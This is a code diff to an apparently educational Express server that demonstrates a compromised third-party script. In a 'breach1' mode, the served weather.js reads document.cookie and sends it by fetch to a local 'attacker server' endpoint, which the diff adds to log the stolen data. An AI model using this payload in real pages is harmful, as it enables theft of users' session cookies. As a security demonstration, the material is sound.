@@ -23,15 +23,22 @@ if (modeIndex !== -1 && args[modeIndex + 1]) mode = args[modeIndex + 1];
 console.log(`[System] Starting ${config.appName} v.${version}...`);
 
 
+app.get('/log', (req, res) => {
+    console.log(`[ATTACKER SERVER] Stolen data received: ${req.query.data}`);
+    res.send("Data logged");
+});
+
 app.get("/weather.js", (req, res) => {
     if (mode === "breach1") {
+        // Скрипт для крадіжки (резулатат видно після перезагрузки сторінки)
         res.type("text/javascript").send(`
-        alert("HACKED: I can see your cookies: " +
-            document.cookie + " and User: " +
-            document.getElementById('username').innerText)`);
+            const stolenCookie = document.cookie;
+            fetch(\`http://localhost:5000/log?data=\${stolenCookie}\`);
+            console.log("Cookie successfully sent to Attacker Server!");
+        `);
+    } else {
+        res.sendFile(path.join(__dirname, "weather.js"));
     }
-
-    else res.sendFile(path.join(__dirname, "weather.js"));
 });
 
 app.listen(PORT, () => {
